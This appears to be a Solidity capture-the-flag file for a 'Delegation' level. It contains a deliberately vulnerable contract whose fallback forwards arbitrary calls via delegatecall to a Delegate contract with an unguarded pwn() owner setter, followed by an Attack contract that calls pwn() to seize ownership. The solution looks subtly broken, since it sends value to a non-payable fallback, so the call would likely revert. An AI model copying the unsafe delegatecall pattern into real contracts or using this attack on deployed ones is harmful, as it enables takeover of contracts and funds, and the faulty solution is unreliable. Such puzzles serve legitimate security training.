// The goal of this level is for you to claim ownership of the instance you are given.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

// Solution

contract Attack {
  Delegation delegation;

  constructor(address _Delegation) payable {
    delegation = Delegation(_Delegation);
  }
    function sendData() external payable {
      bytes memory datapwn = abi.encodeWithSignature("pwn()");
      (bool success, bytes memory data) = address(delegation).call{value : 1000}(datapwn);
      assert(success);
    }
    fallback() external payable {

    }
  receive() external payable {

  }

  }
